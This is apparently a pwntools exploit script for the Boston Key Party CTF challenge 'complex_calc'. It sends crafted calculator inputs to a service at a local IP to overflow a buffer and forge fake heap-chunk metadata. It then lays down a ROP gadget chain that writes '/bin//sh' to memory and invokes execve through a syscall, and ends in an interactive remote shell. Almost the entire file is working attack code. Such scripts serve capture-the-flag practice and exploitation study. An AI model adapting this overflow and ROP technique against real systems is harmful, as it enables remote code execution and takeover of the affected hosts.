from pwn import *

def doAction(conn,x,y,action):
	#Communicate with the service
	conn.sendline(str(action))
	conn.recvuntil(":")
	conn.sendline(str(x))
	conn.recvuntil(":")
	conn.sendline(str(y))
	conn.recvuntil("=>")

def main():
	"""
		bkp-boston-key-party-complex_calc
	"""

	HOST = "192.168.56.101"
	PORT = 49154
	conn = remote(HOST,PORT)
	conn.recvuntil("Expected number of calculations:")
	raw_input("$")
	conn.sendline("255")
	conn.recvuntil("=>")

	#gadget list	
	p = [
		0x0000000000401c87, # pop rsi ; ret
		0x00000000006c1060, # @ .data
		0x000000000044db34, # pop rax ; ret
		0x6e69622f,	    #/bin
		0x68732f2f,	    #//sh
		0x0000000000470f11, # mov qword ptr [rsi], rax ; ret
		0x0000000000401c87, # pop rsi ; ret
		0x00000000006c1068, # @ .data + 8
		0x000000000041c61f, # xor rax, rax ; ret
		0x0000000000470f11, # mov qword ptr [rsi], rax ; ret
		0x0000000000401b73, # pop rdi ; ret
		0x00000000006c1060, # @ .data
		0x0000000000401c87, # pop rsi ; ret
		0x00000000006c1068, # @ .data + 8
		0x0000000000437a85, # pop rdx ; ret
		0x00000000006c1068, # @ .data + 8
		0x000000000041c61f, # xor rax, rax ; ret
		0x000000000046840b, # add al, 0x16 ; ret
		0x000000000046840b, # add al, 0x16 ; ret
		0x00000000004234d8, # add al, 7 ; ret
		0x00000000004234d8, # add al, 7 ; ret
		0x0000000000463b90, # add rax, 1 ; ret
		0x0000000000400488  # syscall
	]

	for x in xrange(0,18+len(p)+1):	

		if x == 13:
			#Add zeroes to front of the mchunkptr
			#doMul(conn,512,4194304*2)
			doAction(conn,512,4194304*2,3)

		elif x == 12:
			#fake mchunkptr, &sub+16
			#doMul(conn,544,13046)
			doAction(conn,544,13046,3)

		elif x == 18:
			#Loop through gadgets, adding to the stack
			for gadget_loc in p:

				if gadget_loc % 2 == 0:
					#doAdd(conn,gadget_loc/2,gadget_loc/2)
					doAction(conn,gadget_loc/2,gadget_loc/2,1)
				else:
					#doAdd(conn,(gadget_loc/2)+1,gadget_loc/2)
					doAction(conn,(gadget_loc/2)+1,gadget_loc/2,1)

				#Check for /bin/sh to append together on the stack versus appending 0's to the front
				if gadget_loc != 0x6e69622f and gadget_loc != 0x68732f2f:
					#0 fill top address
					#doSub(conn,0x41414141,0x41414141)	
					doAction(conn,0x41414141,0x41414141,2)
		else:
			#Padding
			doAction(conn,547397792,547397792+x,1)

	# if((ptr-ptr.prev_size | ptr.prev_size + chunksize(ptr) & 0xfff) != 0: pass check
	#k = lambda p,x,y: ((p-x|x+y) & 0xfff)
	#k(0x6c4ab0,0xab0,0x550)
	"""
	Fake Chunk, sub_x + sub_y = ptr.prev_size, sub_r = chunksize(ptr)
	sub_r = 0x550
	sub_x = 0xab0
	sub_y = 0xab0-0x550 ~= 1374
	 _____________
	|      |      |
	| sub_x| sub_y|
	|______|______|
	|      |      |
	| sub_r|  0's |
	|______|______|
	"""

	#doSub(conn,2736,1374), fake chunk meta-data
	doAction(conn,2736,1374,2)

	#Trigger memcpy overflow
	conn.sendline("5")

	conn.interactive()
	
main()
